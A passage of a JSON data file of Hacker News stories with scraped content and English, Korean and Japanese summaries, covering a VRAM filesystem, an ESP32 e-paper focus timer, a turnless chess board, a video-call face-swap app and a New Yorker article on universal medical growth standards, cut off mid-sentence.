MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\nFROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS\nIN THE SOFTWARE.",
    "summary": {
      "en": "**Summary of vramfs**\n\nvramfs is a utility that allows you to use some of the unused VRAM (Video RAM) on your graphics card as a temporary file storage system, similar to a ramdisk but specifically for VRAM. It is a proof-of-concept tool and works well with modern graphics cards that have 4GB or more VRAM.\n\n**Key Features:**\n- **Performance:** It offers decent read speeds (~2.4 GB/s) and write speeds (2.0 GB/s), though these are lower than traditional ramdisks.\n- **System Requirements:** It runs on Linux with kernel 2.6 or higher, needs FUSE development files, and a GPU that supports OpenCL 1.2.\n- **Installation:** Requires installation of OpenCL drivers, libfuse3-dev, and other development files. You can build it by running `make`.\n- **Usage:** You can mount a VRAM disk with a command that specifies the mount directory and size. A recommended maximum size is 50% of your total VRAM to avoid system instability.\n\n**Implementation Details:**\n- Uses the FUSE library to create a user-space file system, making it easier to work with OpenCL.\n- Allocates memory on the GPU to create a disk and manages files as entry objects, allowing for basic file operations.\n- Not fully thread-safe, but read and write operations temporarily release locks to prevent blocking.\n\n**Performance Testing:**\n- Benchmarks show that 128KB block sizes yield the best performance, while 64KB blocks may be more efficient due to lower overhead.\n\n**Future Development:**\n- Plans to implement RAID-0 for systems with multiple GPUs.\n\n**License:** The software is released under the MIT License, allowing free use and modification. \n\nOverall, vramfs is a novel way to utilize VRAM for file storage, though it is primarily a developmental tool rather than for serious data transfer needs.",
      "ko": "vramfs는 그래픽 카드의 사용되지 않는 VRAM(비디오 RAM)을 임시 파일 저장 시스템으로 활용할 수 있게 해주는 유틸리티입니다. 이는 램디스크와 유사하지만 VRAM에 특화된 기능을 제공합니다. 이 도구는 개념 증명용으로 개발되었으며, 4GB 이상의 VRAM을 가진 최신 그래픽 카드에서 잘 작동합니다.\n\n주요 특징으로는 성능이 있습니다. 읽기 속도는 약 2.4GB/s, 쓰기 속도는 2.0GB/s로, 전통적인 램디스크보다는 낮지만 괜찮은 수준입니다. 시스템 요구 사항으로는 리눅스 커널 2.6 이상에서 실행되며, FUSE 개발 파일과 OpenCL 1.2를 지원하는 GPU가 필요합니다. 설치를 위해서는 OpenCL 드라이버, libfuse3-dev 및 기타 개발 파일을 설치해야 하며, `make` 명령어로 빌드할 수 있습니다. VRAM 디스크를 마운트할 때는 마운트할 디렉토리와 크기를 지정하는 명령어를 사용하며, 시스템 불안정을 피하기 위해 최대 크기는 총 VRAM의 50%로 권장됩니다.\n\n구현 세부 사항으로는 FUSE 라이브러리를 사용하여 사용자 공간 파일 시스템을 생성하고 OpenCL과의 작업을 용이하게 합니다. GPU에서 메모리를 할당하여 디스크를 생성하고, 파일을 엔트리 객체로 관리하여 기본적인 파일 작업을 수행할 수 있습니다. 완전히 스레드 안전하지는 않지만, 읽기 및 쓰기 작업 시 잠금을 일시적으로 해제하여 블로킹을 방지합니다.\n\n성능 테스트 결과, 128KB 블록 크기가 가장 좋은 성능을 보이며, 64KB 블록이 더 낮은 오버헤드로 인해 더 효율적일 수 있습니다. 향후 개발 계획으로는 여러 GPU를 가진 시스템을 위한 RAID-0 구현이 있습니다.\n\n이 소프트웨어는 MIT 라이선스 하에 배포되어 자유롭게 사용하고 수정할 수 있습니다. 전반적으로 vramfs는 VRAM을 파일 저장에 활용하는 새로운 방법이지만, 주로 개발 도구로서 심각한 데이터 전송 필요에는 적합하지 않습니다.",
      "ja": "vramfsは、グラフィックカードの未使用のVRAM（ビデオRAM）を一時的なファイルストレージシステムとして利用できるユーティリティです。これは、ramdiskに似ていますが、特にVRAM用に設計されています。このツールは概念実証のもので、4GB以上のVRAMを持つ最新のグラフィックカードでうまく機能します。\n\n主な特徴としては、まずパフォーマンスがあります。読み取り速度は約2.4GB/s、書き込み速度は2.0GB/sで、従来のramdiskよりは劣りますが、まずまずの速度です。システム要件としては、Linuxのカーネル2.6以上が必要で、FUSEの開発ファイルとOpenCL 1.2をサポートするGPUが求められます。インストールにはOpenCLドライバー、libfuse3-dev、その他の開発ファイルが必要で、`make`コマンドを実行することでビルドできます。使用方法は、マウントするディレクトリとサイズを指定するコマンドを使ってVRAMディスクをマウントします。システムの安定性を保つために、推奨される最大サイズは総VRAMの50%です。\n\n実装の詳細としては、FUSEライブラリを使用してユーザースペースのファイルシステムを作成し、OpenCLとの連携を容易にしています。GPU上にメモリを割り当ててディスクを作成し、ファイルをエントリオブジェクトとして管理することで、基本的なファイル操作が可能です。完全にスレッドセーフではありませんが、読み取りおよび書き込み操作中に一時的にロックを解除することでブロッキングを防いでいます。\n\nパフォーマンステストでは、128KBのブロックサイズが最も良いパフォーマンスを示し、64KBのブロックはオーバーヘッドが少ないため、より効率的かもしれません。\n\n今後の開発計画としては、複数のGPUを持つシステム向けにRAID-0の実装が予定されています。\n\nライセンスはMITライセンスのもとで公開されており、自由に使用や改変が可能です。全体として、vramfsはVRAMをファイルストレージとして活用する新しい方法ですが、主に開発ツールとしての位置づけであり、真剣なデータ転送ニーズには向いていません。"
    }
  },
  {
    "id": "71dfc352216f3af1",
    "title": {
      "en": "Show HN: Physical Pomodoro Timer with ESP32 and e-paper screen",
      "ko": "ESP32 전자 타이머",
      "ja": "ESP32で作る！物理ポモドーロタイマー"
    },
    "type": "story",
    "url": "https://github.com/Rukenshia/pomodoro",
    "score": 279,
    "by": "rukenshia",
    "time": 1743244946,
    "content": "This is the repository for an ESP32 based focus timer. It uses an ePaper display and a rotary dial for input.\nThe code in this repository will not be ready-to-use, as some assets and fonts have been removed. However, if you really want to you should be able to adapt the code to your needs.\nParts List\n\nESP32 (I used an AZDelivery ESP32 NodeMCU)\nWaveShare 4.26inch e-Paper display HAT, 800x480 (link)\nKY-040 rotary encoder with button\nA single WS2812 LED (could be replaced with a simple RGB LED)A\nA USB-C connector (like this one)\n3d printed case (onshape file)\nSome resistors and 0.1uF capacitors\n\nProject Origin\nI love trying out different productivity techniques - some say that the quest to optimize your productivity is the ultimate procrastination method, so maybe that is what drove me to this project. I also have a habit of committing time (around a month of work outside my normal job) once a year to a project that benefits someone else. Last year, I bought a 3D printer (BambuLab X1C) and wanted to put it to good use. I have previously finished an apprenticeship as an electronics\nengineer before pivoting to software engineering, so I also wanted to come back to my roots and build something physical.\nMy friend struggles with time management throughout the day sometimes - lots of different tasks to organize, and little focus. So I thought to myself: Why not make them a focus timer? So, I set out with a few goals:\n\nIt should be a physical device\nIt should be fun\nIt should be intuitive to use\n\nThere are some cool projects out there (arguably much cooler than this, for example the Focus Dial by Salim Benbouziyane), but I wanted to build something from scratch. I also\nnever built something with an ePaper display and thought it might be a good fit for something that is mostly idling and doesn't require a backlight.\nWhy these parts?\nThis was my second dive back into building things with microcontrollers in a long time. I knew ESP32 well enough to feel comfortable diving back in, so that was the main choice here. I did some research before to see what kinds of displays would be supported.\nePaper Display\nI needed some sort of display, or at least I wanted some sort of display. One of the main motivations for this project was that it should be out of your way - until it is time to finish your current focus and move on. For me, this meant that I wanted a display without any backlight.\nThe display should also be large enough that you can put the whole device somewhere on your desk and still be able to read it. After ordering and playing around with a few WaveShare ePaper displays, I settled on the 4.26\" variant for multiple reasons:\n\nGreat resolution (which seems to be really hard to find for \"hobbyist\" displays)\nThe size felt right\nThe display supports partial refreshes (0.3s, no distracting \"black and white flashes\" while refreshing)\n\nInitially, I really wanted to use a black/white/red display and found one that I liked, but the refresh time\nwas a whopping 16 seconds with no support for partial refreshes which was a dealbreaker for me.\nThe final bonus feature: it won't work at night. If your desk is not bright enough, you won't be able to read the display. This is a feature, not a bug. Too dark outside? Stop working already!\nRotary Encoder\nFrom the start, I knew that I wanted some sort of dial as an input - it made the most sense to me. This came at the cost of some complexity when designing the menus, and you really need to make sure that you debounce the input correctly. I also added .1uF capacitors to the CLK and DT pins to help with smoothing out the signal.\nLED\nIn the first few iterations, there was no plan for an LED. My genius plan of having a display without backlight came at a cost: it could be too subtle when your current focus time ended. I experimented with a few different ideas:\n\nA buzzer: this would just make you jump. A truly horrible experience\nSpeakers: I don't know why, but speakers felt hard. So much noise and whining with the setup I tried, but I will blame this on a skill issue\nLED: I had some WS2812 LEDs lying around and thought they might be a good fit. You can animate them with the NeoPixel library, and they are really easy to use. The additional benefit of not needing to commit many more output pins was also a big plus\n\nThe LED ended up working great, allowing me to display different states. It might be subtle, but I also added a little shroud to the case and added a diffusion layer in front of the LED to make it look nicer.\nBuilding the Case\nThe case comes in two parts: the base and a lid. One unfortunate design choice I made is that the display frame is printed as one piece as part of the base, so the top edge tends to warp a little bit during printing. Since CAD (or product design) isn't my strongest suit, there will certainly be better choices to design this for a better final look.\nOne thing that I wished I learned earlier is that it might not have been the best idea to put the dial in the front: because the print and electronics are so lightweight, pressing the switch on the dial will tend to just slide the whole device back. Luckily, I could solve this by adding some rubber feet and weights (the ones usually used to balance tires) to the bottom of the case. This worked out great, and I am happy with how it turned out.\nSoftware\nThe software is written in C++ and uses the Arduino framework. I used PlatformIO to manage the project (at least that is what seemed to be a popular choice, but I am not so sure about that anymore). This project relies heavily\non the GxEPD2 library for the display. I won't lie, the code in this repository is a bit of a mess - I had to get things done in time, which led to quite a bit of copy and pasting and not revisiting earlier parts of the code.\nSome parts were generated by AI (Claude, for the most part) to help me finish the project in the deadline I set myself.\n\nSince this was a project for my friend, I also wanted to include some easter eggs and fun. You would think that adding some random facts while you are supposed to be focused would be a bad idea, but I think it is a fun little addition.\nUsing the Device\nWhen the device starts up, you can either change some settings or go into preset selection mode. From there, you can choose one of three presets:\n\nThe timer will then start and let you know once the time is up (by flashing the LED and displaying a message on the screen). You can keep working (not recommended, but necessary if you want to finish something) and then start the break.\n\nDuring the pause, you can view some statistics. Every few iterations (4 by default), your pause will be longer to give you some time to recover.\n\nDevelopment\nPin Mapping\nRotary Encoder (KY-040)\n\nPIN\n#\n\nCLK\n32\n\nDT\n21\n\nSW\n14\n\nePaper Display (GxEPD2_426_GDEQ0426T82, WaveShare 4.26\" b/w)\n\nPIN\n#\n\nBUSY\n4\n\nRST\n16\n\nDC\n17\n\nCS\n5\n\nCLK\n18\n\nDIN\n23\n\nLED (WS2812)\n\nPIN\n#\n\nDIN\n25",
    "summary": {
      "en": "This project is about creating a focus timer using an ESP32 microcontroller, an ePaper display, and a rotary dial. The code provided is not fully ready to use, as some components and fonts are missing, but it can be adapted for personal needs.\n\n### Key Components:\n- **ESP32 Microcontroller**: The main component used.\n- **ePaper Display**: A 4.26-inch screen chosen for its good resolution and low power consumption, which refreshes quickly.\n- **Rotary Encoder**: Used for input, allowing easy navigation through the timer settings.\n- **LED**: A WS2812 LED is included to signal when focus time ends, providing a subtle alert.\n- **USB-C Connector**: For power.\n- **3D Printed Case**: Designed to house all components.\n\n### Project Motivation:\nThe creator wanted to help a friend with time management by building an intuitive, physical focus timer. This project combines a love for productivity, electronics, and software engineering.\n\n### Design Considerations:\n- The display is designed to be visible only in bright light to encourage breaks when it’s dark.\n- The rotary dial adds complexity but makes the device user-friendly.\n- The LED provides visual feedback without being disruptive.\n- The case was designed to be functional, though some adjustments were made for usability.\n\n### Software:\nThe code is written in C++ using the Arduino framework, utilizing the GxEPD2 library for the display. The software includes settings for different timer presets and some fun features like random facts.\n\n### Usage:\nUpon startup, users can select a preset timer. The device notifies when time is up with a flashing LED and a message. A break follows, during which users can view statistics.\n\n### Conclusion:\nThis project blends hardware and software to create a unique focus timer, aiming to enhance productivity in a fun and user-friendly way.",
      "ko": "이 프로젝트는 ESP32 마이크로컨트롤러, ePaper 디스플레이, 회전 다이얼을 사용하여 집중 타이머를 만드는 것입니다. 제공된 코드는 완전히 사용할 수 있는 상태는 아니며, 일부 구성 요소와 글꼴이 누락되어 있지만 개인의 필요에 맞게 조정할 수 있습니다.\n\n주요 구성 요소로는 ESP32 마이크로컨트롤러가 있으며, 이는 이 프로젝트의 핵심 부품입니다. ePaper 디스플레이는 해상도가 좋고 전력 소모가 적으며 빠르게 새로 고침되는 4.26인치 화면으로 선택되었습니다. 회전 인코더는 입력 장치로 사용되어 타이머 설정을 쉽게 탐색할 수 있게 해줍니다. WS2812 LED가 포함되어 있어 집중 시간이 끝났을 때 미세한 알림을 제공합니다. USB-C 커넥터는 전원 공급을 위해 사용되며, 모든 구성 요소를 수납할 수 있도록 설계된 3D 프린트 케이스도 있습니다.\n\n프로젝트의 동기는 창작자가 친구의 시간 관리를 돕기 위해 직관적인 물리적 집중 타이머를 만들고자 했습니다. 이 프로젝트는 생산성, 전자기기, 소프트웨어 공학에 대한 사랑을 결합한 것입니다.\n\n디자인 측면에서는 디스플레이가 밝은 빛에서만 보이도록 설계되어 어두운 곳에서는 휴식을 유도합니다. 회전 다이얼은 복잡성을 더하지만 사용자 친화적인 장치로 만듭니다. LED는 방해가 되지 않으면서 시각적인 피드백을 제공합니다. 케이스는 기능성을 고려하여 설계되었지만 사용성을 위해 일부 조정이 이루어졌습니다.\n\n소프트웨어는 C++로 작성되었으며 Arduino 프레임워크를 사용하고, 디스플레이를 위해 GxEPD2 라이브러리를 활용합니다. 소프트웨어에는 다양한 타이머 프리셋 설정과 재미있는 기능인 랜덤 팩트도 포함되어 있습니다.\n\n사용자는 기기를 켜면 미리 설정된 타이머를 선택할 수 있습니다. 시간이 다 되면 기기가 깜박이는 LED와 메시지로 알림을 제공합니다. 이후에는 통계를 볼 수 있는 휴식 시간이 주어집니다.",
      "ja": "このプロジェクトは、ESP32マイクロコントローラー、ePaperディスプレイ、回転ダイヤルを使ってフォーカスタイマーを作成することを目的としています。提供されているコードは完全に使用できる状態ではなく、一部のコンポーネントやフォントが欠けていますが、個々のニーズに合わせて調整可能です。\n\n主要なコンポーネントには、ESP32マイクロコントローラーが含まれています。これはプロジェクトの中心的な部品です。次に、解像度が良く、消費電力が低い4.26インチのePaperディスプレイが選ばれています。このディスプレイは素早く更新されます。また、入力用に回転エンコーダーが使われており、タイマー設定を簡単にナビゲートできます。さらに、WS2812 LEDが含まれており、フォーカスタイムが終了した際に微かなアラートを提供します。電源にはUSB-Cコネクタが使用され、すべてのコンポーネントを収めるための3Dプリントケースも設計されています。\n\nこのプロジェクトの動機は、友人の時間管理を助けるために直感的で物理的なフォーカスタイマーを作ることでした。生産性、電子工学、ソフトウェア工学への愛がこのプロジェクトに結集されています。\n\nデザインに関する考慮点として、ディスプレイは明るい光の下でのみ見えるように設計されており、暗い時には休憩を促します。回転ダイヤルは複雑さを加えますが、使いやすさを向上させています。LEDは視覚的なフィードバックを提供しつつ、気を散らさないように配慮されています。ケースは機能的に設計されていますが、使いやすさのためにいくつかの調整が行われました。\n\nソフトウェアはC++で書かれており、Arduinoフレームワークを使用しています。ディスプレイにはGxEPD2ライブラリが利用されています。ソフトウェアには異なるタイマープリセットの設定や、ランダムな豆知識などの楽しい機能が含まれています。\n\n起動時にユーザーはプリセットタイマーを選択できます。タイマーが終了すると、LEDが点滅し、メッセージで通知されます。その後、休憩時間があり、その間に統計情報を確認できます。このプロジェクトはハードウェアとソフトウェアを融合させ、楽しく使いやすい方法で生産性を向上させることを目指しています。"
    }
  },
  {
    "id": "f6d8d29a0fe76c74",
    "title": {
      "en": "\"Moonshots\" Initiative to Secure the Future of RISC OS",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.riscosopen.org/news/articles/2025/03/28/moonshots-initiative-to-secure-the-future-of-the-os",
    "score": 20,
    "by": "kaycebasques",
    "time": 1743285522,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "cf78df02a2c8e9c0",
    "title": {
      "en": "Real Time Chess – A physical chess board without the concept of turns",
      "ko": "즉시 체스: 턴 없는 체스판",
      "ja": "リアルタイムチェス"
    },
    "type": "story",
    "url": "https://github.com/misprit7/real-time-chess",
    "score": 200,
    "by": "dschuessler",
    "time": 1743248514,
    "content": "Real Time Chess\n\n  A physical chess board without the concept of turns\n\n  Video explanation: https://youtu.be/y7VtSK23_Jg\n\nPitch\nChess is boring. I'm boring too so I enjoy it anyways, but I can't help but think \"I could design it better.\" Normally in chess players move sequentially in turns, but this introduces a huge latency bug that the developers of chess forgot to patch: you spend literally half the time waiting for your opponent!\nThe obvious solution is just get rid of the concept of turns in chess altogether and let players move whenever they want. Real time strategy games like StarCraft and Age of Empires are much more fun and spectator friendly than chess, so this should be a pretty uncontroversial minor rules update that can be implemented before the next world championship. To prevent things from getting too chaotic over the board each piece has an individual cooldown, so once it's been moved it can't move for a fixed period afterwards.\nHowever there's an unfortunate roadblock to the widespread adoption of real time chess: as the Niemann controversy has made all too clear, chess is not immune from accusations of cheating through spectator assistance or outside analisys tools. Trying to have players self enforce these piece cooldowns is impossible. However where the intrinsic goodness of the human psyche fails, engineering is always ready to step in. This project is a physical chess board that keeps track and displays the cooldown remaining for each piece, and even physically holds them in place so no accidental cheating can occur.\nDesign Files\nThe firmware and pcb kicad files are in this repo. For the physical design, see the design on OnShape. Other than those parts that were cnced, here were the off the shelf components used:\n\nInsulating washers: One under each electromagnet, to keep them isolated from the casing\nPlastic screws: To attach electromagnets to base, plastic to prevent electrical connection\nThese and these screws: to attach the internal supports and squares respectively\nSpacers: For an offset between the decorative and functional pcbs\nElectromagnets: Most expensive part other than the machining, ~$600 per board. Could probably get them cheaper from China or something but for low quantities this was easiest\n\nKnown Issues\n\nPower distribution: Traces on the pcbs are way undersized given there are many amps running through them, so there are large voltage drops when many pieces are on cooldown simultaneously. To solve this these traces should be much wider\nTolerances: The pcbs have extremely tight tolerances which makes assmbling the board extremely annoying. The edges and holes should probably have more room\nPin heights: The height of the pins for the banana connectors are taller than the mechanical design allows for, these are fairly easy to shorten using a dremel but probably something that should be fixed\nCorner screws: Given the order of assembly, it's impossible to insert/fasten the 4 corner screws",
    "summary": {
      "en": "**Real Time Chess Summary**\n\nReal Time Chess is a new concept that eliminates turns in traditional chess, allowing players to make moves whenever they want. This change aims to make the game more exciting and engaging, similar to real-time strategy games like StarCraft.\n\nKey Features:\n- Players can move pieces at any time, reducing waiting periods during a game.\n- To maintain order, each chess piece has a cooldown period after being moved.\n- A special physical chess board tracks and displays these cooldowns, preventing cheating by holding pieces in place.\n\nChallenges:\n- Accusations of cheating in chess, highlighted by the Niemann controversy, pose a barrier to this new format.\n- The design faces some technical issues, including:\n  - **Power Distribution**: The circuit board traces are too small, causing voltage drops when many pieces are in cooldown.\n  - **Assembly Tolerances**: The tight tolerances make assembly difficult.\n  - **Pin Heights**: The pins for connectors are too tall for the design.\n  - **Corner Screws**: The assembly order makes it hard to fasten corner screws.\n\nOverall, Real Time Chess seeks to modernize the game while addressing technical challenges to ensure fair play.",
      "ko": "실시간 체스는 전통적인 체스의 턴 방식을 없애고 플레이어가 원하는 때에 언제든지 수를 둘 수 있는 새로운 개념입니다. 이러한 변화는 스타크래프트와 같은 실시간 전략 게임처럼 게임을 더 흥미롭고 몰입감 있게 만들기 위한 것입니다.\n\n주요 특징으로는 플레이어가 언제든지 말을 움직일 수 있어 게임 중 대기 시간을 줄일 수 있습니다. 질서를 유지하기 위해 각 체스 말은 이동 후 쿨다운 시간이 필요합니다. 특별한 물리적 체스판이 이러한 쿨다운 시간을 추적하고 표시하여, 말을 고정시킴으로써 부정행위를 방지합니다.\n\n하지만 이 새로운 형식에는 몇 가지 도전 과제가 있습니다. 니먼 논란과 같은 체스에서의 부정행위 의혹이 이 형식의 도입에 장애가 되고 있습니다. 또한 디자인에는 몇 가지 기술적 문제가 있습니다. 첫째, 전원 분배 문제로 회로 기판의 선이 너무 작아 많은 말이 쿨다운 상태일 때 전압 강하가 발생합니다. 둘째, 조립 공차가 너무 좁아 조립이 어렵습니다. 셋째, 커넥터의 핀 높이가 디자인에 비해 너무 높습니다. 마지막으로, 조립 순서 때문에 코너 나사를 조이기가 어렵습니다.\n\n전반적으로 실시간 체스는 게임을 현대화하고 공정한 플레이를 보장하기 위해 기술적 문제를 해결하고자 합니다.",
      "ja": "リアルタイムチェスは、従来のチェスのターン制を排除し、プレイヤーが好きな時に駒を動かせる新しいコンセプトです。この変更により、ゲームはより刺激的で魅力的になり、スタークラフトのようなリアルタイムストラテジーゲームに近づくことを目指しています。\n\nこのゲームの主な特徴は、プレイヤーがいつでも駒を動かせるため、ゲーム中の待機時間が短縮されることです。ただし、秩序を保つために、各駒には移動後のクールダウン期間が設けられています。また、特別な物理的チェスボードがこのクールダウンを追跡し表示することで、駒を動かさずに保持することによる不正行為を防ぎます。\n\nしかし、この新しい形式にはいくつかの課題があります。ニーマンの論争に見られるように、チェスにおける不正行為の疑惑がこの形式の普及の障害となっています。また、デザインにはいくつかの技術的な問題もあります。例えば、回路基板のトレースが小さすぎて、多くの駒がクールダウン中になると電圧が低下することや、組み立ての精度が厳しいために組み立てが難しいこと、コネクタ用のピンがデザインに対して高すぎること、そして組み立て順序のためにコーナースクリューを締めるのが難しいことなどです。\n\n全体として、リアルタイムチェスはゲームを現代化しつつ、技術的な課題に対処して公正なプレイを確保することを目指しています。"
    }
  },
  {
    "id": "21cb1fbcb3976c27",
    "title": {
      "en": "Show HN: Appear as anyone in video calls like zoom or Google meets",
      "ko": "영상통화 변신!",
      "ja": "誰でも変身！ビデオ通話革命"
    },
    "type": "story",
    "url": "https://www.phazr.ai/",
    "score": 56,
    "by": "michaelphi",
    "time": 1743273889,
    "content": "Appear as any character in your next video callWith a single reference photo, you can become your favorite anime character, meme, celebrity, or even your own unique creation. Runs locally on your device for complete privacy. Works on Zoom, Google Meet, Slack, Twitch, Discord, and other video apps.Download for LinuxWindows and Mac versions coming soonRequest early access\n\nRequest Early AccessWindows and Mac versions are coming soon. Sign up to be notified when your preferred platform is available.Request AccessWindowsMacWe'll notify you when it's ready.\n\nSystem Requirements• Ubuntu 22.04 or newer / Debian-based distribution• 8GB RAM (16GB recommended)• NVIDIA GPU with CUDA supportCompatible GPUs:• NVIDIA RTX 4090, 4080, 4070 TI• NVIDIA RTX 3090, 3080 TI• NVIDIA RTX 5090, 5080, 5070, 5060Note: AMD GPUs are not supported at this time.Email addressDownload for LinuxAfter downloading:chmod +x ./phazr-Linux-*.AppImage./phazr-Linux-*.AppImage",
    "summary": {
      "en": "You can now appear as any character in your video calls using just one photo. This feature lets you transform into your favorite anime character, meme, celebrity, or create a unique version of yourself. It works on various video apps like Zoom, Google Meet, Slack, Twitch, and Discord, and runs locally on your device for privacy.\n\nCurrently, it's available for Linux, with Windows and Mac versions coming soon. You can sign up to get notified when those versions are ready.\n\n**System Requirements for Linux:**\n- Ubuntu 22.04 or newer\n- At least 8GB RAM (16GB recommended)\n- NVIDIA GPU with CUDA support (specific models listed)\n\nNote: AMD GPUs are not supported at this time.",
      "ko": "이제 단 한 장의 사진으로 비디오 통화에서 원하는 캐릭터로 변신할 수 있습니다. 이 기능을 통해 좋아하는 애니메이션 캐릭터, 인터넷 밈, 유명인사 또는 자신만의 독특한 버전으로 변신할 수 있습니다. 이 기능은 Zoom, Google Meet, Slack, Twitch, Discord와 같은 다양한 비디오 앱에서 사용할 수 있으며, 개인 정보 보호를 위해 기기에서 로컬로 실행됩니다.\n\n현재 이 기능은 리눅스에서 사용할 수 있으며, 윈도우와 맥 버전도 곧 출시될 예정입니다. 이 버전이 준비되면 알림을 받을 수 있도록 가입할 수 있습니다.\n\n리눅스 시스템 요구 사항은 다음과 같습니다. \n- 우분투 22.04 이상\n- 최소 8GB RAM (16GB 권장)\n- CUDA 지원 NVIDIA GPU (특정 모델 목록 제공)\n\n참고로 현재 AMD GPU는 지원되지 않습니다.",
      "ja": "ビデオ通話で好きなキャラクターに変身できる新機能が登場しました。この機能を使えば、お気に入りのアニメキャラクターやミーム、有名人、さらには自分自身のユニークなバージョンに変わることができます。Zoom、Google Meet、Slack、Twitch、Discordなど、さまざまなビデオアプリで利用でき、プライバシーを守るためにデバイス上で動作します。\n\n現在、この機能はLinux向けに提供されていますが、WindowsとMacのバージョンも近日中に登場予定です。これらのバージョンが準備できた際に通知を受け取るためのサインアップが可能です。\n\nLinuxのシステム要件は以下の通りです。Ubuntu 22.04以上が必要で、最低でも8GBのRAMが必要ですが、16GBを推奨します。また、CUDAサポートのあるNVIDIA GPUが必要です。具体的なモデルについてはリストが提供されています。\n\nなお、現時点ではAMDのGPUはサポートされていません。"
    }
  },
  {
    "id": "437a116b548cbbd0",
    "title": {
      "en": "Medical Benchmarks and the Myth of the Universal Patient",
      "ko": "의료 기준과 환자의 신화",
      "ja": "医療基準と患者神話"
    },
    "type": "story",
    "url": "https://www.newyorker.com/magazine/2025/03/31/medical-benchmarks-and-the-myth-of-the-universal-patient",
    "score": 6,
    "by": "pseudolus",
    "time": 1743038039,
    "content": "Annals of InquiryMedical Benchmarks and the Myth of the Universal PatientFrom growth charts to anemia thresholds, clinical standards assume a single human prototype. Why are we still using one-size-fits-all health metrics?By Manvir SinghMarch 24, 2025FacebookXEmailPrintSave StoryUniversal health standards inform the way we define malnutrition, obesity, growth abnormalities, and more, underpinning broad statistical claims. But they don’t account for human diversity.Illustration by David PlunkertSave this storySave this storySave this storySave this storyWhen my daughter was ten and a half months old, she qualified as “wasted,” which UNICEF describes as “the most immediate, visible and life-threatening form of malnutrition.” My wife and I had been trying hard to keep her weight up, and the classification felt like a pronouncement of failure. Her birth weight had been on the lower end of the scale but nothing alarming: six pounds, two ounces. She appeared as a dot on a chart in which colored curves traced optimal growth; fifteenth percentile, we were told. She took well to breast-feeding and, within a month, had jumped to the twentieth percentile, then to the twenty-sixth. We proudly anticipated that her numbers would steadily climb. Then she fell behind again. At four months, she was in the twelfth percentile. At nine and a half, she was below the fifth.Our pediatrician was worried. Ease off the lentils and vegetable smoothies, we were warned; we needed to get more calories into our babe. Ghee, peanut butter—we were to drench her food in these and other fats and wash them down with breast milk and formula. And that’s what we did. When we came back a month later, though, we learned that she had dropped further—and crossed into “wasted” territory.Was this what malnutrition looked like? She seemed to be flourishing. She was happy, adventurous, and exuberantly social, babbling incessantly and forever engaging strangers with flirtatious stares. She had cheeks as plump as the juicy clementines that she loved to eat with full-fat yogurt. Although slow to hands-and-knees crawling—scooting was her preferred means of locomotion—she was hitting most of her other milestones. She was also growing longer and longer, shooting from the twelfth percentile at birth to the thirty-sixth at ten months.In “Adaptable: How Your Unique Body Really Works and Why Our Biology Unites Us” (Avery), Herman Pontzer, an evolutionary anthropologist at Duke University, recounts facing a similar conundrum. While Pontzer was visiting a semidesert village in northern Kenya to study the Daasanach pastoralists, a German charity representative told him that the community was being devastated by malnutrition. Charity workers had plotted the heights and weights of Daasanach children on World Health Organization charts—the same ones our pediatrician used to monitor my daughter’s growth—and determined that more than two-thirds of the kids were malnourished. As a result, families were enrolled in a nutrition program and provided with high-calorie, industrially processed supplements. Yet, as with my daughter, the numbers didn’t align with ordinary observation.“Everywhere we went, children were running, playing, and laughing,” Pontzer writes. “Kids being kids. They didn’t seem low on energy, nor did they seem particularly short, or ‘stunted.’” He saw no other signs of chronic starvation, such as bloated bellies or reduced fertility among adult women. The kids were slim, but in the lanky way typical of so many East African pastoralists.When Pontzer and his team tracked the growth of Daasanach children, they uncovered patterns that sharply diverged from the W.H.O. curves. At around age two, these kids gain height at rates seldom seen elsewhere in the world. At five, they stand taller, on average, than well-fed kids in Europe and North America. At the same time, they put on weight more slowly, developing lean physiques that are optimal for heat dissipation. Where the German charity diagnosed deficiency, Pontzer saw adaptation.“Adaptable” offers an engrossing, richly informative exploration of human biological diversity. By revealing how our variable bodies respond to a wide range of environments, it challenges us to rethink universal health benchmarks. These standards inform everything from how we define malnutrition and micronutrient deficiencies to how we estimate the risks of growth abnormalities, metabolic disorders, and cardiovascular dysfunction. They drive global funding priorities, shape international aid programs, and inform social policies. They guide individual clinical assessments, like my daughter’s, and underpin broad statistical claims: seventeen per cent of humans are zinc-deficient; nearly a quarter of Asian-Pacific children are stunted. Yet these benchmarks rest on a monolithic image of human health—a prototypical Homo sapiens whose vulnerabilities remain unchanged across climates and genetic histories. We’ve entered the age of neurodiversity, precision medicine, and “bio-individuality,” but we still assume that malnutrition looks the same in Cologne as it does in rural Kenya. Is it time to move beyond the model of the universal patient?For decades, pediatricians relied on growth charts for infants and young toddlers which were wildly and obviously flawed. The W.H.O. had endorsed standards developed by the U.S. National Center for Health Statistics based on data from a single American community—Yellow Springs, Ohio. There were questions about their relevance for children elsewhere in the country, let alone the world. But when the W.H.O. released new child-growth standards, in 2006, it appeared that we at last had a truly global benchmark, drawn from studies of children across five continents.The coördinating team recruited participants from six far-flung locations: Oslo, Norway; Muscat, Oman; Pelotas, Brazil; New Delhi, India; Accra, Ghana; and, as it happens, the city where I live, Davis, California. The researchers maintained strict inclusion criteria—tracking only breast-fed children born to well-off, nonsmoking mothers. The resulting charts gained remarkable traction. By April, 2011, a hundred and twenty-five countries had adopted them, and the United Nations treated them as the new gold standard. Implementation was costly, often requiring countries to overhaul child-health records, retrain medical personnel, and acquire new measurement equipment.These standards seemed authoritative in part because of their vaunted universality. As the project coördinators wrote in 2006, the standards could be used “to assess children everywhere, regardless of ethnicity, socioeconomic status and type of feeding.” The coördinators also noted a “striking similarity” in the data collected among the six sites, which, given the “built-in ethnic or genetic variability,” affirmed “the standards’ universal applicability.”Yet how much variability was there, really? The W.H.O. didn’t publish detailed ethnicity information, but, at the time the data were collected, most residents of Oslo, Pelotas, and Davis were of European ancestry. Africa, with more genetic diversity than any other continent, was characterized by a single site. Pacific Islanders, Indigenous Americans, and, most glaringly, East and Southeast Asians were not represented.The claim of “striking similarity” was also tenuous. The team based its claim on the 